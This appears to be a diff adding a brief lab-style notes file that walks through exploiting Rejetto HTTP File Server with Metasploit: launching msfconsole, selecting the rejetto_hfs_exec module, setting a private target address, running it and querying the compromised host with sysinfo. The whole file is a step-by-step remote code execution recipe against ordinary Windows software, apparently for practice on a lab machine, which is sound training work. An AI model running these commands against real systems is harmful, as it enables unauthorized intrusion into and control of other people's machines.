@@ -1,0 +1,17 @@
+# Launch msfconsole
+msfconsole 
+
+# Search for Exploits
+search rejetto
+
+# Set exploit 
+use exploit/windows/http/rejetto_hfs_exec
+
+# Set Target
+set rhosts 10.0.1.110
+
+# Run Exploit
+run
+
+# OS Information
+sysinfo
